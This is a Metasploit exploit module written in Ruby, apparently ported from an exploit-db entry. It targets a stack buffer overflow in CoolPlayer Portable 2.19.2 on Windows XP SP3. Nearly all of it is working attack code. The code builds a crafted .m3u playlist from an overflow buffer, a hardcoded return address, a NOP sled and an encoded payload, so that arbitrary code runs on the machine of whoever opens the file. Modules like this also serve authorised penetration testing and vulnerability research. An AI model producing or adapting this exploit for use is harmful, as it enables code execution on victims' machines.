require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
         super(update_info(info,
           'Name' => 'CoolPlayer Portable 2.19.2 (.m3u) Stack Buffer Overflow',
           'Description'    => %q{
               This module exploits a stack buffer overflow in versions 2.19.2
             creating a specially crafted .m3u file, an attacker may be able 
             to execute arbitrary code.
            },
            'License' => MSF_LICENSE,
            'Author' => 
             [
             'Securityxxxpert', # Original
             'KedAns-Dz <ked-h[at]hotmail.com>' # MSF Module
             ],
            'Version' => 'Version 1.0',
            'References' =>
              [
                ['URL', 'http://exploit-db.com/exploits/17294' ],
              ],
            'DefaultOptions' =>
              {
                'EXITFUNC' => 'process',
              },
            'Payload' =>
              {
                'Space' => 1024,
                'BadChars' => "\x0a\x3a\x00",
                'StackAdjustment' => -3500,
              },
            'Platform' => 'win',
            'Targets' =>
              [
                [ 'Windows XP SP3 (En)', { 'Ret' => 0x77F31D8A} ], #  EIP , gdi32.dll
              ],
            'Privileged' => false,
            'DefaultTarget' => 0))

        register_options(
           [
              OptString.new('FILENAME', [ false, 'The file name.', 'KedAns.m3u']),
           ], self.class)
    end
 
    def exploit

     sploit = rand_text_alphanumeric(321) # Buffer Overflow
        sploit << [target.ret].pack('V')
        sploit << "\x90" * 30 # Nopsled 
        sploit << payload.encoded
        sploit << "\x90" * 5 + "1337day" + "\x90" * 5
        sploit << rand_text_alphanumeric(11)
 
        ked = sploit
        print_status("Creating '#{datastore['FILENAME']}' file ...")
        file_create(ked)
 
    end
 
end
